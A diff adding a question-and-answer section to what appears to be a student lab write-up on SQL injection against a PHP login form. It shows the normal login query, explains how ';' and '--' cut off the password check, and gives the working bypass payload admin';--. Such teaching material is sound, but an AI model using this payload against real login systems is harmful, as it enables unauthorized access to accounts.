@@ -40,6 +40,40 @@ The most important part of the document is this:
 ?>
 ```
 
+## Questions
+
+### Q1. Which SQL Query is executed everytime a user tries to login?
+
+Considering that the user is not an attacker, a normal query to a normal input from a user would look like this:
+
+```sql
+SELECT username FROM user WHERE username = '<username>' AND password = '<password>'
+```
+
+### Q2. Which inputs you can manipulate to encroach the query? Which Special Characters you use and why?
+
+For this exploit, the most important keywords that we might have in mind are:
+
+* `;`: This character is important because it represents the end of an sql statement
+
+* `--`: These two characters together are the declaration of the beggining of a comment in SQL.
+
+### Q3. Qual query SQL é efetivamente executada com a tua tentativa de login maliciosa? Porque é que essa query te permite fazer login?
+
+The actual query that is done is this one:
+
+```sql
+SELECT username FROM user WHERE username = 'admin'; -- AND password = '".$password."'";
+```
+
+Which is semanticaly equivelant to this:
+
+```sql
+SELECT username FROM user WHERE username = 'admin';
+```
+
+which do not require the password to enter into the system.
+
 ```
 admin';--
 ```
